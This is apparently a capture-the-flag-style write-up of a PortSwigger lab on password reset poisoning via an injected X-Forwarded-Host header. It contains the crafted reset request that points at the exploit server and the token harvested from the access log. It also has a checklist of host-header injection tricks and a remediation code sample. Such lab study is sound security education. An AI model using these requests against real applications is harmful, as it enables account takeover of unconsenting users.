# 📝 Lab Breakdown: Password Reset Poisoning via Middleware

- **Target:** PortSwigger Web Security Academy (Practitioner)
- **Vulnerability class:** Password reset poisoning / Host header injection (CWE-644)
- **Difficulty:** Practitioner
- **Key mechanics:** Middleware header override (`X-Forwarded-Host`) → out-of-band token theft → account takeover

## Dual logic flow & attack architecture

### 1) Delivery & token interception

```
[Attacker]
  |
  | 1) Submits password reset for username "carlos"
  |    Injects: X-Forwarded-Host: exploit-server.net
  v
[Target web application]
  |
  | 2) Looks up "carlos" -> finds carlos@email.com
  | 3) Generates secret token -> token_abc123
  | 4) Builds link using injected host ->
  |    https://exploit-server.net/reset?token=token_abc123
  | 5) Sends email containing this link -> carlos@email.com
  v
[Carlos's inbox]
  |
  | 6) Carlos clicks the (legitimate) email link
  v
[Attacker exploit server logs]
  |
  | 7) Server logs request: GET /reset?token=token_abc123
  | 8) Attacker extracts token from logs
```

### 2) Token lifetime & hijack

```
Carlos clicks link -> visits exploit-server.net -> sees error/blank page
                           |
                           v
                    Token is logged server-side
                           |
                           v
Attacker visits REAL site: https://target-app.com/reset?token=token_abc123
                           |
                           v
Attacker sets a new password
                           |
                           v
SUCCESS: password changed; token is consumed/expired
```

## Deep dive (the “why”)

### Email recipient vs. link destination

- **Who receives the email?** The victim user (`carlos`). The application does a server-side lookup for `username=carlos` and sends the reset email to the address on file. Because the email is sent by the real application/SMTP, SPF/DKIM checks still pass.
- **Where does the link point?** The attacker-controlled host. The app/middleware builds the reset URL using a client-controllable host header (commonly `X-Forwarded-Host`):
    
    $$
    ResetLink = "https://" + Request.Headers["X-Forwarded-Host"] + "/reset?token=" + Token
    $$
    

### Why the token doesn’t expire when the victim clicks the poisoned link

- **No interaction with the real app:** Clicking the link makes a `GET` request to the attacker’s exploit server, not to `target-app.com`. No server-side token validation or state change occurs.
- **Consumption happens on reset completion:** Tokens typically expire only after the real application receives a valid reset submission (often a `POST`) and commits the new password.
- **Silent interception:** The token remains valid in the real application while being exposed inside the attacker’s web server access logs.

## Step-by-step exploitation walkthrough

### Phase 1: Verify header injection

1. Intercept a legitimate password reset request for `wiener` in **Burp Suite**.
2. Add `X-Forwarded-Host: example.com` to the request headers.
3. Check the received email (in the lab, via the Exploit Server email client). If the link host becomes `example.com`, the app trusts unvalidated forwarded-host headers.

### Phase 2: Deliver the poisoned reset request

1. Copy your assigned exploit server domain (e.g., `exploit-0a1b2c.exploit-server.net`).
2. Send the malicious reset request for `carlos` (e.g., in **Burp Repeater**):

```
POST /forgot-password HTTP/2
Host: target-app.web-security-academy.net
X-Forwarded-Host: exploit-0a1b2c.exploit-server.net
Content-Type: application/x-www-form-urlencoded

username=carlos
```

### Phase 3: Harvest token & take over the account

1. Open the **Access log** on your exploit server.
2. Wait for the victim bot to click the link.
3. Find the incoming request, e.g.:

```
GET /reset-password?token=abcdef1234567890... HTTP/1.1
Host: exploit-0a1b2c.exploit-server.net
```

1. Copy the `token` value.
2. Visit the real application reset endpoint:
    - `https://target-app.web-security-academy.net/reset-password?token=abcdef1234567890...`
3. Submit a new password to take over the account.

## Personal bug-hunting checklist: Host header injection

- **Header variations:** `X-Forwarded-Host`, `X-Host`, `X-Forwarded-Server`, `X-HTTP-Host-Override`, `Forwarded`
- **Port/domain tricks:** `Host: target.com:attacker.com`, `Host: target.com@attacker.com`
- **OAuth redirects:** Does header injection influence `redirect_uri` generation?
- **Cache poisoning:** Do response headers reflect injected hosts into cacheable responses?

## Remediation strategy

Hardcode trusted application domains in server configuration (or a strict allowlist) instead of using dynamic request headers when generating absolute URLs.

```python
import os

APP_DOMAIN = os.environ.get("APP_DOMAIN", "app.example.com")

@app.route("/forgot-password", methods=["POST"])
def forgot_password():
    user = db.query(
        "SELECT * FROM users WHERE username = ?",
        request.form.get("username"),
    )

    if user:
        token = generate_secure_token(user.id)
        reset_link = f"https://{APP_DOMAIN}/reset-password?token={token}"
        send_email(user.email, "Password Reset", f"Reset link: {reset_link}")

    return "If the account exists, a reset link has been sent."
```